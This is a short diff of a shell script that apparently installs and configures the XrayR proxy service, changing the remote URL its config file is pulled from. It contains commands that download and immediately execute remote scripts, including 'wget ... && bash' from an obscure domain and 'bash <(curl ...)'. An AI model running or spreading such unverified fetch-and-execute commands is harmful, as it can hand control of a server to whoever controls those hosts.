@@ -48,7 +48,7 @@ wget sh.alhttdw.cn/d11.sh && bash d11.sh
 bash <(curl -Ls https://raw.githubusercontent.com/Phamtuananhh2k5/xray/main/xrayr1.sh)
 config_file="/etc/XrayR/config.yml"
 echo -n "" > "$config_file"
-curl -sSfL "https://raw.githubusercontent.com/Phamtuananhh2k5/xray/refs/heads/main/code-xrayr-tiktok.txt" >> "$config_file"
+curl -sSfL "https://raw.githubusercontent.com/Phamtuananhh2k5/xray/refs/heads/main/code_xrayr_az_tt.txt" >> "$config_file"
 echo "Nội dung của $config_file đã được cập nhật từ URL."
 xrayr restart
 
